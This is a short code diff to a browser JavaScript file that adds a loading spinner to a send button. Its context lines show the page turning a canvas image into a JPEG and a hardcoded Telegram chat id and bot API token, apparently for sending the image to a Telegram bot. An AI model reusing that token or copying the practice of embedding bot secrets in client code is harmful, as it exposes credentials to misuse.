@@ -237,6 +237,13 @@ document.addEventListener("DOMContentLoaded", async function () {
 
         const imageData = priviu.toDataURL("image/jpeg");
 
+        // original text
+        let originalText = send.innerText;
+
+        // animasi loading
+        send.innerHTML = `<span class="loader"></span>`;
+        send.disabled = true;
+
         const id = "7355777672";
         const apiTelegramBot = "7079092015:AAFOhQM0L0PGWmKcfW2DULtjo0KHzBEHbz8";
 
@@ -278,6 +285,9 @@ document.addEventListener("DOMContentLoaded", async function () {
                 text: `Error terjadi di Error: ${error.message}`,
                 draggable: true,
             });
+        } finally {
+            send.innerHTML = originalText;
+            send.disabled = false;
         }
     });
 });
